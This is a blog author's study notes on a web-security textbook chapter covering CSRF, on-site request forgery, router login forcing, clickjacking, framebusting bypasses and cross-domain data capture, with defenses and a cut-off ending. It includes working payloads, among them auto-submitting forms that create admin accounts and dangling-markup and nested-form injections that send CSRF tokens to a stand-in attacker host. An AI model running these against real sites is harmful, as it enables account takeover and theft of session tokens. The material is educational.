**Note:** This is the eigth installment of my notes and reflections from The Web Application Hacker's Handbook. These reminders are neither exhaustive nor definitive—they're simply a personal tool to help me absorb, understand, and organize new material in a way that works for me.

# Attacking Users: Other Techniques

In the previous chapter, we explored the grandfather of user-targeted attacks—Cross-Site Scripting (XSS). While XSS is widespread and powerful, it is not the only way to exploit end users. This chapter expands the arsenal by covering a variety of other attacks that target users directly.

Some of these attacks share similarities with XSS, but they can be more subtle, harder to detect, and capable of succeeding even when classic XSS defenses are in place. Because of their nuance, these techniques are often misunderstood or overlooked—not only by developers but sometimes even by penetration testers. Our goal here is to clarify these lesser-known vulnerabilities, show how they arise, and walk through the steps required to identify and exploit them.

### Inducing User Actions:

One of the most dangerous consequences of XSS is the ability to *induce a user to perform unintended actions* within the application. For example, tricking an administrator into visiting a malicious page could result in silent actions being executed on their behalf—like creating a new admin account or modifying system settings—leading to total compromise.

But here’s the twist: XSS isn’t the only way to make this happen. Even in applications that have hardened themselves against XSS, attackers can still find ways to hijack user actions. This section introduces additional methods for inducing user interaction, with a focus on request forgery attacks.

**Request Forgery:**

Request forgery (sometimes called *session riding*) is closely related to session hijacking, but with an important difference:

- *Session hijacking* requires stealing a user’s session token so the attacker can impersonate them.

- *Request forgery* doesn’t require the attacker to ever see or know the token. Instead, the attacker manipulates the victim’s browser into automatically including their session token in malicious requests.

This works because browsers are designed to *automatically attach session identifiers* (like cookies) to requests made to a site the user is logged into. If an attacker can trick the user’s browser into sending a crafted request, the browser will obediently include the session cookie—giving the malicious request full legitimacy in the eyes of the application.

This type of vulnerability is generally divided into two main categories:

- *On-site request forgery* – where the malicious request is triggered from within the same application (e.g., through a hidden form or script injection).

- *Cross-site request forgery (CSRF)* – where the attack originates from an external site controlled by the attacker, but still targets the victim’s active session with the vulnerable application.

Imagine a user logged into their online banking account. If the application is vulnerable to CSRF, an attacker could send them a link to a malicious page containing hidden code like:

```
<img src="https://bank.example/transfer?to=attacker&amount=1000">
```

When the victim’s browser loads this image, it automatically sends a GET request to the bank—including the victim’s session cookie. If the bank processes this request without verifying that the action was intentionally initiated by the user, money gets transferred without their knowledge.

### On-Site Request Forgery (OSRF):

On-site request forgery (OSRF) is often overshadowed by stored XSS attacks, since XSS provides a direct way to execute malicious scripts in a victim’s browser. However, OSRF can be just as dangerous—and in some cases possible even when XSS has been fully mitigated.

A well-known example of OSRF combined with XSS was the *MySpace Samy worm*, where a malicious script embedded in a profile caused every visitor to unknowingly take actions, such as adding Samy as a friend. But here’s the important twist: *OSRF doesn’t require JavaScript at all.* If user-supplied input is placed inside certain attributes (like the target of an image or link), you can still induce a victim’s browser to make arbitrary requests.

Imagine a message board where users can submit posts. A submission might look like this:

```
POST /submit.php
Host: wahh-app.com
Content-Length: 34

type=question&name=daf&message=foo
```

The server processes this request and displays it back to other users in HTML form:

```
<tr>
  <td><img src="/images/question.gif"></td>
  <td>daf</td>
  <td>foo</td>
</tr>
```

*Note:* The ```<tr>``` tag in HTML defines a table row, while the ```<td>``` tag defines a table data cell within that row. Together, they are used to organize and display data in a structured format within a table.

At first glance, everything looks safe. You might even test for XSS, but suppose the application is diligently HTML-encoding ```<``` and ```>``` characters so you cannot inject a script tag. No scripts, no alerts—so is it secure? Not quite.

Look again: you control part of the ```src``` attribute of the ```<img>``` tag. While you cannot break out of the quotes, you can modify the *URL path* to trick the browser into making arbitrary requests within the same site. For example, submitting the following in the type parameter:

```
../admin/newUser.php?username=daf2&password=0wned&role=admin#
```

Produces this HTML on the messages page:

```
<tr>
  <td><img src="/admin/newUser.php?username=daf2&password=0wned&role=admin#"></td>
  <td>daf</td>
  <td>foo</td>
</tr>
```

When another user views the page, their browser attempts to load that “image.” If the viewer is an administrator, the crafted request executes with *their privileges*, creating a new backdoor account. This works *even without JavaScript*—the browser just follows the ```src``` as if it were an image.

**Why the ```#``` Matters?**

In the payload above, notice the ```#``` character. It’s a fragment identifier: everything after ```#``` is ignored by the server. This effectively terminates the request before the ```.gif``` suffix is appended by the application. Example with ```#```:

```
/admin/newUser.php?username=daf2&password=0wned&role=admin#question.gif
```

The browser sends:

```
GET /admin/newUser.php?username=daf2&password=0wned&role=admin
```

Alternatively, you could use ```&``` to fold the suffix into the query string instead of cutting it off:

```
/admin/newUser.php?username=daf2&password=0wned&role=admin&suffix=question.gif
```

Which results in a request like:

```
GET /admin/newUser.php?username=daf2&password=0wned&role=admin&suffix=question.gif
```

Both tricks allow the malicious request to be completed.

**Hack Steps for OSRF:**

1. *Look beyond XSS.* Whenever user input is displayed back to other users but XSS isn’t possible, check whether OSRF might be possible.

2. *Find insertion points.* Focus on places where user input is inserted into URLs or resource attributes (```href```, ```src```, ```action```). If dots (```.```), slashes (```/```), or query delimiters (```?```, ```&```, ```=```) are allowed, the application is likely vulnerable.

3. *Craft your request.* Identify a sensitive on-site endpoint (like account creation or configuration changes) and embed it into your OSRF payload.

4. *Test with privilege escalation.* When a high-privilege user (such as an administrator) views the injected content, see if your crafted request executes.

**Defenses Against OSRF:**

- *Strict input validation:* In our example, the ```type``` parameter should only accept predefined values (e.g., ```question```, ```answer```).

- *Block dangerous characters:* If open-ended input is necessary, reject any strings containing ```/ . \ ? & =```.

- *Don’t rely on encoding:* Simply HTML-encoding these characters doesn’t help—browsers will decode them when building the request.

OSRF is like a ghost cousin of XSS—no script needed, just the browser’s obedient request-making behavior. If XSS is blocked but input still lands inside a URL, the stage is set for exploitation.

### Cross-Site Request Forgery (CSRF):

In a *cross-site request forgery (CSRF)* attack, an attacker tricks a victim’s browser into sending a crafted request to a vulnerable application. On the surface, the attacker’s page may look harmless, but behind the scenes it forces the browser to perform an action on the target site—such as transferring money, changing a password, or creating an admin account—without the victim’s intent.

*Why CSRF Works?*

The core enabler is the *same-origin policy.* This browser security feature prevents one site from reading the response of a request made to another domain. However—and this is key—it *does not stop a site from sending requests to other domains.*

- The attacker cannot read the response, but they don’t need to.

- CSRF is a *one-way attack:* the attacker just needs the request to go through, leveraging the victim’s authenticated session.

That’s why CSRF can’t be used for multi-stage attacks that require reading server output (like Samy’s XSS worm). But it’s perfect for *blind actions*—changing data, performing transactions, or altering user settings.

Suppose administrators of an application can create new users by submitting this request:

```
POST /auth/390/NewUserStep2.ashx HTTP/1.1
Host: mdsec.net
Cookie: SessionId=8299BE6B260193DA076383A2385B07B9
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

realname=daf&username=daf&userrole=admin&password=letmein&confirmpassword=letmein
```

Notice three risky features here:

1. *Privileged action:* this request creates an administrator.

2. *Cookie-based session tracking only:* no extra tokens or unpredictable values are required.

3. *Predictable parameters:* the attacker can guess or determine all the fields.

Put together, this makes CSRF possible. The attacker can build a malicious page containing:

```
<html>
  <body>
    <form action="https://mdsec.net/auth/390/NewUserStep2.ashx" method="POST">
      <input type="hidden" name="realname" value="daf">
      <input type="hidden" name="username" value="daf">
      <input type="hidden" name="userrole" value="admin">
      <input type="hidden" name="password" value="letmein">
      <input type="hidden" name="confirmpassword" value="letmein">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

When a logged-in admin visits this page, their browser automatically attaches the session cookie for ```mdsec.net``` and submits the form. The application sees a valid request from an authenticated user—and silently creates the attacker’s account.

*Real-World Example: eBay, 2004*

Security researcher Dave Armstrong discovered a CSRF vulnerability in eBay. Attackers could craft a URL that caused the victim’s browser to place an auction bid. A malicious site could embed this URL, and any eBay user visiting the site would unknowingly place a bid.

eBay tried to defend against stored CSRF attacks by validating ```<img>``` tags in auction descriptions, ensuring the target returned a valid image. However, attackers bypassed this with a *time-of-check, time-of-use (TOCTOU) flaw:*

1. During auction creation, the attacker’s image URL returned a real image (passing the validation check).

2. Later, the attacker changed the server’s response to redirect to a malicious CSRF URL.

3. Anyone viewing the auction triggered the CSRF request and placed a bid.

**Understanding TOCTOU:**

*Time-of-check, time-of-use (TOCTOU)* means that the application checks a resource at one point in time but uses it later, assuming nothing has changed. An attacker exploits the gap between *check* and *use.*

- *Check:* “Is this URL an image?” – yes, it returns image/png.

- *Use:* “Load the same URL now” – but the attacker has swapped it with a redirect to a malicious endpoint.

This race between validation and usage creates a window for abuse.

Overall, CSRF turns the victim’s browser into a Trojan horse. The attacker doesn’t need to steal cookies or bypass authentication—they let the browser handle it for them. If the app relies only on cookies and predictable parameters, it’s vulnerable.

*Modern-Day Relevance:*

While CSRF was rampant in the 2000s, many applications today implement mitigations such as:

- *CSRF tokens* – random, unique values tied to each user’s session and embedded in forms. Since an attacker cannot predict the token, forged requests fail.

- *SameSite cookies* – a browser-level setting that restricts cookies from being sent with cross-site requests, blocking many CSRF attempts by default.

- *Origin and Referer checks* – validating that sensitive requests originate from the same domain.

That said, CSRF is far from dead. Misconfigurations (like missing or weak tokens, overly lax SameSite settings, or relying only on Referer headers) still leave cracks to slip through—just like VLANs that “look segmented” but secretly share the same trunk.

### Exploiting CSRF Flaws:

CSRF vulnerabilities usually arise when an application *relies only on cookies for session tracking.* Once a cookie is set in a user’s browser, the browser will automatically submit it with every request to that domain—whether that request originates from inside the application, from an external site, or even from a link in an email. If an application doesn’t take precautions, an attacker can *ride on the victim’s authenticated session* and perform actions without their knowledge.

*Hack Steps:*

1. *Review key functionality.* From your application mapping, identify areas where users can perform sensitive actions—changing passwords, transferring funds, deleting accounts, posting content, etc.

2. *Identify a vulnerable function.* Look for an action that:

- Relies *only* on cookies for authentication.

- Uses predictable parameters that the attacker can fully control.

- Does *not* use CSRF tokens, nonces, or other unpredictable values.

3. *Craft the malicious request.*

- For *GET requests*, you can use a simple HTML tag:

```
<img src="https://target.app/changeEmail?email=hax@evil.com">
```

- For *POST requests*, create an auto-submitting form:

```
<form action="https://target.app/changePassword" method="POST">
  <input type="hidden" name="newPass" value="Owned123!">
</form>
<script>document.forms[0].submit();</script>
```

The victim only needs to be logged in to the target app and then load this crafted page (via email, malicious site, forum post, etc.).

4. *Test it.* Stay logged into the app in your browser, load your malicious HTML, and verify that the action executes silently.

**Why CSRF Amplifies Other Vulnerabilities:**

CSRF can turn “boring” or “low impact” vulnerabilities into serious ones. Example:

- Imagine an admin-only endpoint ```/admin/viewUser?uid=123``` that fetches user data.

- It has *strict access controls*, but also a *SQL injection flaw* in the ```uid``` parameter.

- Since the endpoint wasn’t designed for regular users, the developers didn’t protect it with CSRF tokens.

From an attacker’s perspective, this is gold: they can create a malicious page that tricks an authenticated admin into visiting it, thereby exploiting the SQL injection and exfiltrating data. Suddenly, a flaw that might have been dismissed as “low risk” becomes a full-blown compromise.

*Modern Note:* While many frameworks today auto-generate CSRF tokens, these protections are often misconfigured or missing in legacy apps, internal tools, or hastily written APIs. Attackers still look for CSRF in places like:

- Admin panels without token validation.

- APIs misusing cookies for auth (instead of ```Authorization``` headers + CORS).

- “Forgotten” endpoints that bypass protections.

Always remember: *if cookies = only gatekeeper, CSRF = wide open door.*

### Authentication and CSRF:

CSRF attacks depend on tricking the victim’s browser into performing *privileged actions within their authenticated session.* Normally, this requires the victim to already be logged into the target application. But attackers are crafty—they don’t always wait for a user to be logged in. Sometimes they can *manufacture the login state themselves* and then ride it to victory.

*Example 1: Home Routers & Default Credentials*

A notorious hotspot for CSRF has been the *web interfaces of consumer DSL/cable routers.* These often expose dangerous features, such as opening all ports on the firewall, changing DNS servers, upgrading firmware.

Many of these functions were historically not protected against CSRF. On top of that, most home users:

- Don’t change the router’s default internal IP address (often ```192.168.0.1``` or ```192.168.1.1```).

- Don’t change default credentials (```admin:admin```, ```admin:password```, etc.).

This opens the door for a *two-stage CSRF attack:*

1. Stage 1 – Forced Login:

The attacker’s page sends a hidden login request with default credentials:

```
<form action="http://192.168.1.1/login.cgi" method="POST">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="password" value="admin">
</form>
<script>document.forms[0].submit();</script>
```

If the credentials are valid, the router sets a session cookie.

2. Stage 2 – Malicious Action:

With the victim’s browser now “authenticated,” the attacker’s page submits a second request to open the firewall, change DNS, etc. Result: the attacker silently hijacks the victim’s home network.

*Example 2: Forced Login with Attacker’s Account*

CSRF can also create login states in *applications where the victim wasn’t logged in at all.* Example:

- An application lets users upload and download files.

- Downloaded files are only accessible to the uploader.

- There’s no input filtering, so uploaded files can contain *stored XSS* payloads.

At first glance, this looks harmless:

- The attacker can only “attack themselves” by downloading their own poisoned files. But CSRF changes the equation:

1. Force the victim to log in with the attacker’s credentials.

```
<form action="https://target.app/login" method="POST">
  <input type="hidden" name="username" value="eviluser">
  <input type="hidden" name="password" value="P@ssword123">
</form>
<script>document.forms[0].submit();</script>
```

2. Force the victim’s browser to fetch the attacker’s malicious file.

```
<img src="https://target.app/download?id=maliciousFile">
```

3. Stored XSS executes in the victim’s browser.

Now the attacker has script execution in the context of the app, even though the victim is technically logged in as the attacker.

4. Pivot to the victim’s real account.

The XSS payload can log the victim out and prompt them to log back in with their own credentials, capturing session tokens, cookies, or data along the way. Result: what looked like a self-contained vulnerability turns into a *full account compromise* via CSRF + stored XSS chaining.

*Modern Note:*

- *Routers/IoT devices:* This exact attack still pops up in cheap IoT devices, where default creds + no CSRF protection = easy hijack.

- *Web apps:* Some apps still allow CSRF login forcing because they don’t bind sessions to IP/device or use SameSite cookies correctly.

- *Chaining:* CSRF is rarely devastating alone, but when paired with stored *XSS, SQLi, or weak defaults*, it becomes the skeleton key to escalation.

### Preventing CSRF Flaws:

*Why CSRF Exists?*

Browsers automatically attach cookies to every request sent to the cookie’s domain. If a web app relies *only* on cookies to identify the session, an attacker can trick a victim’s browser into sending a forged request—because the cookies ride along for free.

*Core Defense: The Anti-CSRF Token:*

The classic defense is to add a *second proof of intent*—a unique, unpredictable token that must accompany any state-changing request. Typical pattern:

1. Server generates a cryptographically random token bound to the user’s session.

2. The token is embedded in the HTML form as a hidden field (or occasionally in a custom header set by JavaScript).

3. On submission, the server verifies that both the session cookie and the matching token are present.

Because the attacker’s page can’t read the token, they can’t forge a valid request.

*Note:* If the token isn’t tied to the user’s specific session, an attacker could capture one valid token (e.g., from their own account) and reuse it. That’s a *token replay* problem. Good implementations bind the token to the session and often to the specific request path or even a timestamp to stop this.

**Implementation Pitfalls:**

- *Predictable or short tokens.*

Even if you think “nobody will brute-force it,” never cut corners—use cryptographically strong randomness.

- *Session-independent tokens.*

If the token isn’t linked to the session, a stolen or guessed token works for anyone.

- *Token reuse across steps.*

Multistep wizards (e.g., “add user → confirm → submit”) still need a valid token for *each* POST. Don’t assume “two screens is enough protection.”

- *Redirect leaks.*

Sometimes an app sets a token in a response and immediately issues an HTTP redirect to a URL that contains the token as a query parameter. The victim’s browser will happily follow the redirect and then automatically send that token again—no attacker interaction required. In other words, the “hidden” token just became part of a GET request that anyone can replay.

**Old-School Token Enumeration:**

The book describes a clever historical attack:

- If a site puts the CSRF token in a *GET parameter,*

- and reuses the same token for the whole session,

an attacker could try to *discover* the valid token by exploiting browser history. The trick was to create hundreds of fake links and use JavaScript’s ```getComputedStyle()``` to check which ones the victim had visited (visited links rendered differently in CSS). That revealed which token the user had already loaded.

*Modern reality:*

- Major browsers now prevent CSS history-sniffing.

- SameSite cookies and stricter referrer policies also make this harder.

- Tools like Burp Suite or custom scripts used to automate this, but today this specific trick is largely obsolete.

Still, the lesson stands: *never expose CSRF tokens in URLs.*

**Don’t Trust the ```Referer``` (or ```Origin```) Header Alone!**

Relying on ```Referer``` to confirm the request’s source is brittle:

- Some privacy extensions strip it.

- Users behind proxies or with strict policies can block it.

- In the past Flash and meta-refresh could spoof it; Flash is gone, but header-spoofing via custom clients still exists.

```Origin``` is more reliable than ```Referer``` but still best used as a *supplement*, not the only defense.

*Additional Notes:*

- ```Referer``` header – Sent with most HTTP requests. Shows the *full* URL of the page that triggered the request (including path and query). Can be trimmed or removed by browsers, privacy extensions, or meta-refresh tricks. Older spelling mistake (“Referer” instead of “Referrer”) stuck as the official name.

- ```Origin``` header – Introduced later for CORS and CSRF protection. Contains only the *scheme + host + port* (e.g., ```https://example.com```). Sent automatically with most cross-site POST/PUT/DELETE requests, and with CORS preflights. Less leaky (no path or query) and harder to spoof from a normal browser.

So: ```Referer``` = “exact page you came from,” noisy and optional; ```Origin``` = “which site started this request,” cleaner and more trustworthy—but still not enough as your sole CSRF defense.

**Modern Best Practice Checklist:**

1. *SameSite Cookies* – Mark session cookies as ```SameSite=Lax``` or ```Strict``` to stop most cross-site requests by default.

2. *Per-request Anti-CSRF Tokens* – Strong randomness, tied to session, ideally single-use.

3. *Custom Header for APIs* – For XHR/Fetch calls, require a custom header (e.g., ```X-CSRF-Token```) that a pure cross-site form can’t set.

4. *Avoid Tokens in URLs* – Keep them in POST bodies or headers only.

5. *Short Lifetimes* – Rotate tokens often and invalidate on logout.

CSRF defense isn’t about building an impenetrable wall; it’s about adding checks the attacker’s browser *cannot guess or replay.*

### Defeating Anti-CSRF Defenses with XSS:

It’s often repeated that *any* cross-site scripting (XSS) flaw instantly defeats cross-site request forgery (CSRF) protections. That’s only half true.

The intuition is sound: JavaScript injected by an XSS bug runs inside the target origin, so it can read anti-CSRF tokens from responses and include them in forged requests. But if the vulnerable page itself is protected by a strong anti-CSRF check and the XSS is *reflected*, things get tricky. Why?

Because the very first request that delivers the malicious payload is a *cross-site* request. If the page requires a valid CSRF token before rendering, the attacker’s initial request will be rejected before the injected script ever appears. So the question isn’t whether injected JavaScript *could* read the token—it’s whether you can ever get that script onto a page that contains one. That said, XSS can still punch holes in CSRF defenses in several common situations:

1. *Stored XSS:*

*Any* stored (a.k.a. persistent) XSS on a CSRF-protected endpoint is game over. The attacker’s script is saved by the application itself, so when a legitimate user loads the page the script is delivered along with a valid anti-CSRF token. The payload can immediately read and reuse the token.

2. *Partial Protection:*

If only part of a multi-step action uses tokens, a reflected XSS elsewhere can harvest them. Example: step one of a funds transfer lacks CSRF protection, but step two requires a token. A script injected through an unrelated reflected XSS can call step one, grab the token from the response, and submit step two—all within the victim’s browser.

3. *User-Bound but Not Session-Bound Tokens:*

Some apps generate tokens tied to a *user account* rather than the current session. Suppose the login form itself isn’t CSRF-protected. An attacker can:

- log in to their own account and copy their anti-CSRF token,

- use CSRF to make the victim silently log in as the attacker,

- fire the XSS payload using the known token.

The payload can then log the victim back out or steal fresh credentials, depending on the goal.

4. *Session-Bound Tokens with Cookie Injection:*

If tokens are tied to a session but the attacker can plant cookies (via a separate vulnerability like subdomain cookie injection), they can feed both their own session ID and matching anti-CSRF token to the victim’s browser, then replay the same multistage trick.

*Note about subdomain cookie injection:* Many sites set cookies for a *parent* domain (e.g. ```.example.com```) so that every subdomain (```shop.example.com```, ```blog.example.com```, etc.) can read and write them. If *any* subdomain is vulnerable to XSS or arbitrary response header injection, an attacker can plant or overwrite cookies—like a session ID or anti-CSRF token—for the entire parent domain. When the victim later visits the main site, the browser will automatically send the attacker’s forged cookies, effectively giving the attacker control over that user’s session state.

The takeaway: well-implemented CSRF defenses *do* raise the bar against exploiting reflected XSS. But any XSS—stored or reflected—remains a critical vulnerability. Never rely on CSRF protections as a safety net; fix the script injection first.

### UI Redress (Clickjacking):

Anti-CSRF defenses rely on the idea that a request originates from the user’s *own* interaction with the legitimate site. UI redress attacks—often called *clickjacking, strokejacking,* or simply “interface redressing”—short-circuit that assumption.

The attacker’s page causes the victim to interact with the target site while believing they’re clicking or typing into something completely different. From the target application’s point of view, the requests really are coming from the user’s browser, so any anti-CSRF token on the page is submitted and validated normally.

*Basic Overlay Attack:*

1. *Framing the target:*

The attacker embeds the vulnerable page inside an ```<iframe>``` on their own site.

2. *Visual misdirection:*

CSS is used to shrink, reposition, or make that iframe fully transparent. The attacker then layers their own enticing UI on top—perhaps a “Click to win!” button or a simple game.

3. *The hidden click:*

The visible button aligns perfectly with the invisible “Confirm Transfer” button inside the iframe. When the victim clicks what looks like a harmless control, the underlying iframe receives the click and submits the legitimate form—complete with the unpredictable anti-CSRF token that was already present in the page.

Because the token never leaves the legitimate domain and the attacker never needs to read it, the site happily accepts the request.

*Going Beyond a Simple Click:*

Attackers can script far more elaborate interactions:

- *Keystroke redirection:* A fake prize form captures the victim’s typing and forwards only specific keystrokes (e.g., numbers) to a hidden field in the target frame—useful when the target form needs an amount or password.

- *Drag-and-drop abuse:* A casual game can coax the user into dragging text or images, which the attacker secretly re-routes to fields inside the target page. Dragging a link can even leak full URLs or anti-CSRF tokens if the victim is logged in.

The key point: the victim provides the input, the target page processes it, and same-origin protections never block the action.

*Present-Day Reality:*

Modern browsers and frameworks have made clickjacking harder but not impossible.

- *Defensive headers* like ```X-Frame-Options: DENY``` or ```SAMEORIGIN``` and the more flexible ```Content-Security-Policy: frame-ancestors 'none'``` are widely supported. Sites that set these headers correctly can’t be iframed at all.

- *UI complexity* (drag-drop APIs, pop-ups, iframes with sandbox flags) still offers opportunities when sites forget these headers or misconfigure them.

- Mobile apps and embedded browsers sometimes strip or ignore headers, re-introducing old weaknesses.

In practice, successful UI-redress attacks today usually exploit *forgotten legacy endpoints*, poorly maintained admin panels, or custom widgets that must allow framing for business reasons.

For a deeper dive and creative attack variations, see: [Marcus Niemietz, UI Redressing Attacks (2021)](https://informatik.rub.de/wp-content/uploads/2021/11/UIRedressing_Marcus-Niemietz.pdf)

### Framebusting Defenses:

When clickjacking (UI-redress) attacks first became public, many big sites rushed to add a client-side defense called *framebusting.* The idea is simple: every sensitive page runs a small JavaScript check to see whether it is being displayed inside an ```<iframe>```. If it detects that it’s framed, the page tries to *break out*—that is, force itself to load as the *top-level* page in the browser window—or it shows an error screen instead. This was also used against other frame-based attacks (for example, “frame sniffing”), so some sites already had it in place.

*A Typical Framebusting Snippet:*

```
<script>
if (top.location != self.location) {
    top.location = self.location;
}
</script>
```

- ```self.location``` is the URL of the current page (the child frame).

- ```top.location``` is the URL of the topmost browser frame.

- If they differ, the script concludes that the page is embedded in someone else’s frame.

- It then tries to “bust out” by assigning ```self.location``` to ```top.location```.

*What “reloading itself into the top-level frame” means?*

The script tells the browser, *“Replace whatever the outer page is showing with me.”* So if the attacker’s page had your bank site hidden in an iframe, the code attempts to shove the bank’s page into the whole tab or window, effectively kicking out the attacker’s overlay.

*Why It Didn’t Work So Well:*

A 2010 Stanford study looked at the top 500 websites and found that every implementation of framebusting could be defeated in at least one browser. The problem is that the attacker controls the *parent* page and can interfere with the child’s attempts to escape. Common bypasses include:

1. Redefining ```top.location```

Because the attacker owns the top frame, they can overwrite or shadow critical variables before the child tries to use them. Example (Internet Explorer quirk):

```
var location = 'foo';
```

Here the attacker creates a local variable called ```location``` in the top window’s scope. When the child frame executes ```top.location```, it no longer points to the genuine location object—it hits this harmless string instead and throws an exception. Result: the framebusting code fails silently.

2. Hooking ```onbeforeunload```

Browsers fire the ```window.onbeforeunload``` event just before a page is about to navigate away. The attacker can attach a handler in the top frame:

```
window.onbeforeunload = function() {
    window.location = '/blank204';  // a URL returning HTTP 204 No Content
};
```

When the child tries ```top.location = self.location```, the parent’s handler runs first and immediately redirects to a harmless 204 response. A 204 tells the browser “no content, stay put,” effectively cancelling the navigation chain and leaving the top frame unchanged.

*Additional Notes:*

The syntax looks a little weird at first, but it’s just how the browser’s event model works. ```window.onbeforeunload``` is a special event hook: when the page is *about to unload* (navigate away, close tab, refresh, etc.), the function you assign gets called. 

The ```/blank204``` path is just an endpoint that returns an HTTP 204 (“No Content”) response—basically an empty, do-nothing page. Why bother? Usually to cancel visual flashes, stop long network requests, or break the site’s own unload handlers. Assigning a function is required because ```onbeforeunload``` expects a callable; you can’t just write a URL string.
Think of it as wiring up a little alarm that runs your code the moment the tab starts to disappear. If the user tries to close the tab, the whole window, or even quits the browser, the unload sequence still fires. Caveats though:

- If the browser crashes or the OS force-kills the process, there’s no chance for the event.

- Modern browsers throttle or ignore anything heavy inside the handler, and most won’t show the old custom “Are you sure?” text anymore.

3. Using the ```sandbox``` Attribute

The attacker can load the target page like this:

```
<iframe src="https://target.example" sandbox="allow-same-origin">
</iframe>
```

By selectively setting sandbox flags, the parent disables scripts in the child frame. No script execution means the framebusting JavaScript never runs, yet cookies still work—so the target site remains fully functional inside the attacker’s frame.

*Additional Notes:*

The HTML ```<iframe>``` ```sandbox``` attribute is like a mini “lock-down mode” for whatever page you’re embedding. When you add the attribute—```<iframe sandbox>```—the browser enforces a restrictive baseline:

- No JavaScript execution (scripts are blocked)

- No form submissions

- No plugins

- No top-level navigation, etc.

You can then *whitelist* specific abilities with flags such as:

- ```allow-scripts``` – lets scripts run

- ```allow-forms``` – lets form submissions happen

- ```allow-same-origin``` – makes the frame keep its original origin instead of becoming a unique, opaque origin.

So if the attacker writes:

```
<iframe src="https://target.example" sandbox="allow-same-origin">
</iframe>
```

they’re saying: “Give this frame normal same-origin privileges so cookies still work, *but do not allow scripts to execute.”*

Because they’ve omitted ```allow-scripts```, the browser refuses to run any JavaScript in the child, including the site’s own framebusting code. Result: the target page loads and can use its cookies/sessions, but its protective script never fires—perfect for a clickjacking setup.

4. Exploiting IE’s Old XSS Filter

Older Internet Explorer versions tried to protect users by disabling any script that looked like it might be injected. If the attacker appends a query parameter to the iframe URL that contains a snippet of the victim’s framebusting code, IE thinks the script in the page is a reflection of the query string and blocks it. The legitimate framebusting code is neutered, leaving the frame intact.

*Takeaways:*

Framebusting was a clever quick fix, but it relied on fragile client-side behavior. Because the attacker always controls the top window, they can tamper with variables, events, or browser quirks to keep the frame in place. Modern best practice is to *prevent framing entirely at the HTTP level:*

- ```X-Frame-Options: DENY``` or ```SAMEORIGIN```

- ```Content-Security-Policy: frame-ancestors 'none'```

These headers are enforced by the browser itself, so no amount of JavaScript trickery in the parent page can override them.

### Preventing UI Redress (Clickjacking):

Frame-busting JavaScript (for example, code that checks ```if (top !== self) top.location = self.location;```) can discourage some clickjacking attempts, but it’s not a guaranteed defense. Clever attackers can disable or bypass those checks—so it should never be your only safeguard.

A stronger, standards-based defense is the ```X-Frame-Options``` HTTP response header, introduced with Internet Explorer 8 and now supported by all major browsers. It tells the browser when (or if) a page is allowed to be loaded inside a ```<frame>``` or ```<iframe>```:

- ```DENY``` – Block all framing, no exceptions.

- ```SAMEORIGIN``` – Allow framing only when the parent page is served from the same origin as the protected page.

Example (HTTP response header):

```
X-Frame-Options: DENY
```

or

```
X-Frame-Options: SAMEORIGIN
```

Modern practice is to pair or replace this with the more flexible *Content Security Policy* directive:

```
Content-Security-Policy: frame-ancestors 'self'
```

This supports multiple allowed origins and is now the preferred approach.

*Audit all variants of the application, including mobile UIs.* Developers sometimes protect the desktop site while leaving a mobile path—like ```https://wahh-app.com/mobile/chat/—unguarded```. Because mobile endpoints often share the same session cookies and can be accessed from a regular desktop browser, an attacker could target the weaker mobile interface to perform a clickjacking or other UI redress attack.

### Capturing Data Across Domains:

The *same-origin policy* normally prevents code on one domain from reading responses that come from another domain. This is why cross-site request forgery (CSRF) is often called a *one-way* attack: an attacker can trigger a request to another site, but cannot simply read the private response.

However, clever abuse of browser parsing rules and weak HTML filtering can sometimes break that “read” barrier. The following techniques show how limited HTML injection—*not* full XSS—can still leak sensitive data.

#### Limited HTML Injection:

Many apps allow a restricted subset of HTML in user-supplied content:

- Web-mail clients might display emails with ```<b>``` or ```<i>``` but strip ```<script>```.

- Dynamic error pages might reflect a small amount of markup for styling.

Suppose a vulnerable mail app reflects user input inside a page like this:

```
<form action="http://wahh-mail.com/forwardemail" method="POST">
  <input type="hidden" name="nonce" value="2230313740821">
  <input type="submit" value="Forward">
</form>
<script>
  var _StatsTrackerId = "AAE78F27CB3210D1";
</script>
```

The hidden ```nonce``` parameter is a CSRF token. Even if the app filters out ```<script>``` tags, it still allows basic HTML—enough for mischief.

*Additional Notes:*

- ```var _StatsTrackerId = "AAE78F27CB3210D1";``` looks like the kind of line you’d see from an analytics or metrics plugin. That little snippet isn’t part of the attack at all—it’s just “background noise” that the book’s example page happened to include.

- Its only real role in the example is to provide that closing single quote inside the ```<script>``` tag. Because the attacker’s ```<img>``` URL never closed its quote (in the example below), the browser keeps reading everything—including the hidden form and eventually this script—until it hits the next ```'```. That’s when the browser thinks, “Okay, the URL is finished.”

- However, in the snippet we see only double quotes around the JavaScript string:

```
<script>
  var _StatsTrackerId = "AAE78F27CB3210D1";
</script>
```

Browsers will happily end the attacker’s unterminated ```<img src='…``` URL at *either* a single *or* a double quote, whichever comes first.

In the example below the attacker started their tag with a single quote:

```
<img src='http://mdattacker.net/capture?html=
```

That means the browser is now scanning forward for the next single-quote *or* double-quote that could legally terminate the attribute. When it eventually hits the double quote before ```AAE78F27CB3210D1```, it says “close enough” and ends the attribute there.

**Attack 1 – Unterminated ```<img>``` URL:**

The attacker injects:

```
<img src='http://mdattacker.net/capture?html=
```

Notice the deliberate “mistakes”:

- *Single-quoted URL* – The attacker opens a single quote but never closes it.

- *Unclosed ```<img>``` tag* – The browser keeps slurping everything that follows as part of the ```src``` attribute until it eventually finds another single quote.

When the victim loads the page, the browser builds the request:

```
GET /capture?html=<form%20action="http://wahh-mail.com/forwardemail"
%20method="POST"><input%20type="hidden"%20name="nonce"
%20value="2230313740821">… HTTP/1.1
Host: mdattacker.net
```

Essentially, the entire remainder of the HTML—*including the hidden CSRF token*—is URL-encoded and sent to the attacker as part of the image request.

Why it works: browsers are lenient. They happily treat line breaks and other markup as part of a long URL until that closing quote appears inside the later ```<script>``` tag.

**Attack 2 – Nested ```<form>``` Trick:**

Alternatively, the attacker injects:

```
<form action="http://mdattacker.net/capture" method="POST">
```

Browsers ignore a second, nested ```<form>``` but associate *all* following form elements with the *first* ```<form>``` they encounter. When the victim clicks “Forward,” the request goes to the attacker’s server instead:

```
POST /capture HTTP/1.1
Host: mdattacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 192

nonce=2230313740821&…
```

This version uses only valid HTML and may evade simple “allow-list” filters, though it needs the user to actually submit the form.

*Key Takeaways:*

